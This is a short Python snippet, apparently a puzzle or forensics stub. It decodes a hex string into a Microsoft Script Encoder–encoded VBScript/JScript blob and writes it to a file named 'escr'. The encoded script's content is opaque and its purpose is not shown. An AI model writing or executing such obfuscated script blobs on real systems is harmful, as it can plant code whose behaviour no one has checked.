hexd = "23407E5E4B67454141413D3D2D6D447E7F783727787F682C296D446B2D2B6F7238257F6D5976457F556D4462324F5255747F56734A622041782D6B4D4778732B554F764A6E2E47312B642F7262705C434D50096C3A7F277F555C764A2F72746E69504149317A5C3272236937432E5031746D446427556E535029444D435876637B536C637E717F4226667E382B2B7E2B4276387E46797E6C7B7E2B465326527E2A5379477E322B7E57257E382B547E2B464221532A31537925532A795363527E2A2A42252053584F23495C6D2E2C30736D6F7B4A4A70304B2E60625072782C6D34434D2F235057566D6F5F7B6A4F4462785452574447683B7443443B474E7F605543732B525E346D442F57396E7A5963625D096C3A7F525E6E7854593423256D34434D2F2462442370386C5E6E2E5976305E6C4C23496131774141413D3D5E237E40"
import binascii

hexd = binascii.unhexlify(hexd)

with open('escr', 'wb') as f:
	f.write(bytearray(hexd))